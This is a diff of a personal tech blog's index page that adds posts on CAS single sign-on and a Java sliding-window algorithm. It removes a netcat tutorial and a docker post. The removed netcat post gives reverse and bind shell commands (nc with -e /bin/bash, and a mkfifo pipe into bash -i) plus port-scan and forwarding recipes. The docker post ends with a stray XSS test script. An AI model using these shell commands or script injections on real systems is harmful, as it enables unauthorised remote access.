@@ -138,6 +138,189 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-base/cas-sso/cas" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/30/base/cas-sso/cas/">Cas 单点登录原理</a>
+    </h1>
+  
+
+        
+        <a href="/2019/05/30/base/cas-sso/cas/" class="archive-article-date">
+  	<time datetime="2019-05-30T08:30:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="单点登录"><a href="#单点登录" class="headerlink" title="单点登录"></a>单点登录</h3><p>单点登录（Single Sign-On ,简称SSO),只用户只需在一个地方登录，就能保持登录状态访问所有相互信任的子系统。</p>
+<h3 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h3><p>CAS 为 Central Authentication Service。<br><br>CAS 分为 CAS Server 和 CAS Client.<br></p>
+<ul>
+<li>CAS Server 负责用户的认证和授权</li>
+<li>CAS Client 与受保护的客户端应用部署在一起，负责认证用户是否登录,同时负责处理对客户端受保护资源的访问请求，需要登录时，重定向到CAS Server，以Filter方式保护受保护的资源。</li>
+</ul>
+<h4 id="一-授权与登录操作"><a href="#一-授权与登录操作" class="headerlink" title="一.授权与登录操作"></a>一.授权与登录操作</h4><h6 id="1-未登录时"><a href="#1-未登录时" class="headerlink" title="1.未登录时"></a>1.未登录时</h6><p><img src="http://67.216.218.37:8000/file/blogs/base/cas/cas01.png" alt="cas01"><br>如图:<br></p>
+<ul>
+<li>(1)客户端(即浏览器)请求资源(需要登录的受限资源)，CAS Client发现无权限(未登录，通过cookies中JSESSIONID判断是否登录)，尝试获取ticket(未获取到)。</li>
+<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)获取ticket，此时ticket不存在(未登录)，返回登录页面。</li>
+<li>(3)客户端进行登录(带上认证信息，原本的请求资源地址，sessionid,sessionid为CAS Client生成)，CAS Server 验证通过，生成与sessionid进行关联的随机ticket,将请求的cookie中jsessionid设置为传过来的sessionid，并返回重定向(要请求的资源地址，带上ticket)<br><img src="http://67.216.218.37:8000/file/blogs/base/cas/cas_sessionid01.png" alt="cas_session01"><br>将会话的jsessionid设置为图中1.</li>
+<li>(4)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证</li>
+<li>(5)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client(可以理解为服务端) 利用前面设置的JSESSIONID为该用户创建session会话，维护登录状态(JSESSIONID)，并返回原本受限的请求资源</li>
+</ul>
+<h6 id="2-已登录时"><a href="#2-已登录时" class="headerlink" title="2.已登录时"></a>2.已登录时</h6><p>当已登录的用户第一次访问其它互相信任的系统时：<br></p>
+<ul>
+<li>(1)客户端请求资源(需要登录的受限资源)，CAS Client发现无权限(此时该系统还未登录过，session会话未创建)，尝试获取ticket(未获取到)。</li>
+<li>(2)CAS Client 返回重定向(CAS Server 登录地址)并在请求地址中带上原本要请求的资源地址，客户端请求该地址(重定向自动请求)根据session获取ticket，此时ticket已存在,重定向请求。</li>
+<li>(3)此时，CAS Client发现请求无权限(未登录)，尝试获取ticket(获取到),CAS Client拿着ticket去CAS Server 进行认证，认证成功后设置该域的session.</li>
+<li>(4)此时，CAS Server 发现该ticket认证通过，返回登录成功的信息，CAS Client 为该用户创建session会话，保存在域下的登录状态，返回原本受限的请求资源。</li>
+</ul>
+<h4 id="二-登录状态判断"><a href="#二-登录状态判断" class="headerlink" title="二.登录状态判断"></a>二.登录状态判断</h4><p>已登录的用户在再次请求受限资源时，不能每次都去认证中心(CAS Server)判断是否登录(效率低)。<br><br><img src="http://67.216.218.37:8000/file/blogs/base/cas/cas_cookie01.png" alt="cas01"><br>当一个已经登录过的用户，再次请求该系统资源时，CAS Client会去session中查找用户信息(通过请求头的cookie中JSESSIONID字段的值)，判断是否登录。不用再去CAS Server认证。<br><br>不同的域，各自维护自己的session.<br></p>
+<h4 id="三-退出"><a href="#三-退出" class="headerlink" title="三.退出"></a>三.退出</h4><ul>
+<li>(1)客户端向当前web应用发起退出请求。</li>
+<li>(2)应用取消本地会话session，同时通知CAS Server，用户已登出，清除TGT。</li>
+<li>(3)应用返回客户端登出请求。</li>
+<li>(4)CAS Server 通知所有用户登录访问的应用，用户已登出。</li>
+</ul>
+<h4 id="四-CAS中的ticket"><a href="#四-CAS中的ticket" class="headerlink" title="四.CAS中的ticket"></a>四.CAS中的ticket</h4><ul>
+<li>TGT：TGT是CAS为用户签发的登录票据，拥有了TGT，用户就可以证明自己在CAS成功登录过。TGT封装了Cookie值以及此Cookie值对应的用户信息。用户在CAS 认证成功后，CAS生成cookie，写入浏览器，同时生成一个TGT对象，放入自己的缓存，TGT对象的ID就是cookie的值。当HTTP再次请求到来时，如果传过来的有CAS生成的cookie，则CAS以此cookie值为key查询缓存中有无TGT ，如果有的话，则说明用户之前登录过，如果没有，则用户需要重新登录。</li>
+<li>ST：服务票据，ST是CAS为用户签发的访问某一service的票据。用户访问service时，service发现用户没有ST，则要求用户去CAS获取ST。用户向CAS发出获取ST的请求，如果用户的请求中包含cookie，则CAS会以此cookie值为key查询缓存中有无TGT，如果存在TGT，则用此TGT签发一个ST，返回给用户。用户凭借ST去访问service，service拿ST去CAS验证，验证通过后，允许用户访问资源。</li>
+<li>LT: 定制login页面时候，提交以后还是要提交到cas进行验证，那么参数中需要带lt，这个lt必须在前面获取到，防止重复提交之类的作用。</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">base</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/05/30/base/cas-sso/cas/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-java/sildewindow/manacher" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/29/java/sildewindow/manacher/">滑动窗口解决最长子串问题</a>
+    </h1>
+  
+
+        
+        <a href="/2019/05/29/java/sildewindow/manacher/" class="archive-article-date">
+  	<time datetime="2019-05-29T06:25:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题"></a>1.问题</h4><p>寻找一个字符串中最长不重复的字符串长度。<br><br>(1)通用做法:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for(int i=0; i&lt;len; i++)&#123;</span><br><span class="line">    for(int j=i; j&lt;len; j++)&#123;</span><br><span class="line">      //找到以i开头的最长不重复子串</span><br><span class="line">      if()&#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>(2)用滑动窗口来解决<br></p>
+<h4 id="2-滑动窗口"><a href="#2-滑动窗口" class="headerlink" title="2.滑动窗口"></a>2.滑动窗口</h4><p>原理：<br><br>维护一个长度为right-left的窗口，通过左右边界的收缩与拓展来找到最大长度。<br><br>只需一次遍历，时间复杂度O(n).<br></p>
+<h4 id="3-实现"><a href="#3-实现" class="headerlink" title="3.实现"></a>3.实现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int lengthOfLongestSubstring(String s) &#123;</span><br><span class="line">        //滑动窗口</span><br><span class="line">        int left = 0, right = 0;</span><br><span class="line">        int max = 0;</span><br><span class="line">        Set window = new HashSet();</span><br><span class="line">        while(left&lt;s.length() &amp;&amp; right&lt;s.length())&#123;</span><br><span class="line">            if(!window.contains(s.charAt(right)))&#123;</span><br><span class="line">                window.add(s.charAt(right));</span><br><span class="line">                right++;</span><br><span class="line">                //更新最大值</span><br><span class="line">                max = Math.max(max,right-left);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">              //收缩左边界到没有重复为止，</span><br><span class="line">              //按照顺序收缩，例 abcb-&gt;bcb-&gt;cb</span><br><span class="line">                window.remove(s.charAt(left));</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/05/29/java/sildewindow/manacher/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-java/manacher/manacher" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -783,203 +966,9 @@
 
 
   
-    <article id="post-security/netcat" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/17/security/netcat/">netcat</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/17/security/netcat/" class="archive-article-date">
-  	<time datetime="2019-01-17T07:19:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>netcat简称nc, 能通过tcp和udp在网络中读取数据。在两台电脑间建立连接，监听并返回两个数据流。</p>
-<h4 id="1-常用参数："><a href="#1-常用参数：" class="headerlink" title="1.常用参数："></a>1.常用参数：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-4/6 使用IPv4/6地址</span><br><span class="line">-b 允许broadcast广播</span><br><span class="line">-c  发送CRLF（回车换行 Carriage-Return Line-Feed）当line-ending</span><br><span class="line">-d 不尝试读取stdin</span><br><span class="line">-I length 设置TCP接收的buffer的大小</span><br><span class="line">-i interval 设置发送和接收间的延迟秒数，</span><br><span class="line">-l 监听模式</span><br><span class="line">-n 直接使用ip,不通过域名服务器DNS查询域名</span><br><span class="line">-o length  设置TCP发送的buffer大小</span><br><span class="line">-P 代理名字</span><br><span class="line">-p nc使用的端口</span><br><span class="line">-v verbose更多输出信息</span><br><span class="line">-w timeout</span><br><span class="line">-u 使用UDP</span><br><span class="line">-r 随机选择端口</span><br><span class="line">-s source  设置本地主机送出数据包的IP地址</span><br></pre></td></tr></table></figure>
-<h4 id="2-使用例子"><a href="#2-使用例子" class="headerlink" title="2.使用例子"></a>2.使用例子</h4><h5 id="1-建立连接，聊天"><a href="#1-建立连接，聊天" class="headerlink" title="1.建立连接，聊天"></a>1.建立连接，聊天</h5><pre><code>nc -l port 在本地主机监听一个端口&lt;br&gt;
-nc ip port 在其它主机与之建立连接（默认TCP），发送消息
-</code></pre><h5 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h5><pre><code>原理，进行tcp三次握手建立连接，如果成功则说明端口开放，容易被防火墙，IDS检测到&lt;br&gt;
-nc -v -n -z ip port(可以是范围)&lt;br&gt;
-    -v进行详细输出&lt;br&gt;
-    -n不进行域名查询&lt;br&gt;
-    -z建立连接后关闭连接，不进行数据交换&lt;br&gt;
-</code></pre><h5 id="3-数据传输-甚至可以传输流媒体）"><a href="#3-数据传输-甚至可以传输流媒体）" class="headerlink" title="3.数据传输(甚至可以传输流媒体）"></a>3.数据传输(甚至可以传输流媒体）</h5><pre><code>类似于聊天，只是将输入换成文件，使用重定向或者管道符&lt;br&gt;
-server:  nc -l port &lt; file1.txt&lt;br&gt;
-clien: nc -n ip port &gt; file2txt&lt;br&gt;
-file1往file2传数据&lt;br&gt;
-</code></pre><h5 id="4-获取shell，正反向shell"><a href="#4-获取shell，正反向shell" class="headerlink" title="4.获取shell，正反向shell"></a>4.获取shell，正反向shell</h5><pre><code>如果有-e参数，直接 nc ip port -e /bin/bash&lt;br&gt;
-无-e参数时:&lt;br&gt;
-server:&lt;br&gt;
-mkfifo /tmp/fifo&lt;br&gt;
-cat /tmp/fifo | /bin/bash -i 2&gt;&amp;1 | nc -l port &gt; /tmp/fifo&lt;br&gt;
-client:&lt;br&gt;
-nc ip port&lt;br&gt;
-原理：&lt;br&gt;
-bash -i 进入交互模式&lt;br&gt;
-通过mkfifo 建立一个管道（命令管道）文件，将管道文件的内容通过匿名管道传给/bin/bash执行，然后再将nc监听到的输入写入fifo,形成一个循环
-</code></pre><h5 id="5-端口转发"><a href="#5-端口转发" class="headerlink" title="5.端口转发"></a>5.端口转发</h5><pre><code>- 背景：192.168.1.103的msfadmin用户需要访问192.168.1.102的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前msfadmin用户只能访问192.168.1.102的9000端口。需要9000端口做转发。
-- 目标：msfadmin通过访问192.168.1.102的9000端口，达到与8000端口通话的目的。
-原理：&lt;br&gt;
-在102上：nc -l 8000&lt;br&gt;
-              cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo
-在103上：&lt;br&gt;
-        nc 192.168.1.102 9000&lt;br&gt;
-在102主机上，开启要转发的8000端口，然后用9000端口通过接收数据，然后连接本地8000端口，将命令管道的数据通过匿名管道传给8000端口
-</code></pre>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/17/security/netcat/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-tools/docker" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/16/tools/docker/">docker</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/16/tools/docker/" class="archive-article-date">
-  	<time datetime="2019-01-16T09:25:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>docker的本意是希望容器是无状态的，即箱子有什么就用什么，我们外部不做修改，如果我需要改代码则重新build一个image出来。<br><br>镜像与容器，我的理解是将自己的程序做成镜像，放到容器中运行，容器提供运行环境。</p>
-<h4 id="一-install"><a href="#一-install" class="headerlink" title="一.install"></a>一.install</h4><p>ubuntu 16.04 LTS<br></p>
-<h5 id="1-sudo-apt-install-docker-io"><a href="#1-sudo-apt-install-docker-io" class="headerlink" title="1.sudo apt install docker.io"></a>1.sudo apt install docker.io</h5><h5 id="2-阿里镜像加速"><a href="#2-阿里镜像加速" class="headerlink" title="2.阿里镜像加速"></a>2.阿里镜像加速</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&apos;EOF&apos;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://etuznpiq.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-<p>保存为sh,执行</p>
-<h5 id="3-重启"><a href="#3-重启" class="headerlink" title="3.重启"></a>3.重启</h5><p>servie docker restart</p>
-<h5 id="4-登录"><a href="#4-登录" class="headerlink" title="4.登录"></a>4.登录</h5><p>sudo docker login –username=17888824094 registry.cn-hangzhou.aliyuncs.com</p>
-<h5 id="5-拉取远程镜像"><a href="#5-拉取远程镜像" class="headerlink" title="5.拉取远程镜像"></a>5.拉取远程镜像</h5><p>sudo docker pull microsoft/aci-helloworld</p>
-<h5 id="6-启动"><a href="#6-启动" class="headerlink" title="6.启动"></a>6.启动</h5><p>这是启动镜像<br><br>docker run  镜像 (-d deamon模式)<br><br>例: docker run -d -p 8888:80 microsoft/aci-helloworld<br><br>-p：物理机端口，要转发的端口，可以多个端口 -p 8888:8888 8889:8889 3000:3000<br><br>目录挂载:-v $PWD/www:/www  将主机中当前目录下的www挂载到容器的/www</p>
-<h5 id="7-查看"><a href="#7-查看" class="headerlink" title="7.查看"></a>7.查看</h5><p>docker ps 查看容器信息<br><br>docker logs 容器id   查看容器内日志</p>
-<h5 id="8-关闭"><a href="#8-关闭" class="headerlink" title="8.关闭"></a>8.关闭</h5><p>这是操作的容器<br><br>docker stop 容器id<br><br>docker ps -a  查看关闭的容器<br><br>docker restart 容器id    重启容器<br><br>docker rm 容器id  删除容器</p>
-<h5 id="9-进入container"><a href="#9-进入container" class="headerlink" title="9.进入container"></a>9.进入container</h5><p>sudo docker exec  -it 9a8(容器id前三位) /bin/sh<br><br>交互模式， /bin/sh为要使用的$PATH,进入容器内进行操作</p>
-<h5 id="10-保存对容器的修改"><a href="#10-保存对容器的修改" class="headerlink" title="10.保存对容器的修改"></a>10.保存对容器的修改</h5><p>对容器的修改默认是保存的<br><br>docker commit 698 name(生成一个新的版本名)</p>
-<h5 id="11-生成自己的image"><a href="#11-生成自己的image" class="headerlink" title="11.生成自己的image"></a>11.生成自己的image</h5><p>&lt;scr<script>ipt&gt;alert(“XSS”);&lt;/scr<script>ipt&gt;</p>
-</script></p>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">tools</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">docker</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/16/tools/docker/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 
@@ -1090,11 +1079,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color4">security</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">security</a>
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1107,6 +1096,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">protocol</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">base</a>
               </li>
              
               <li class="article-tag-list-item">
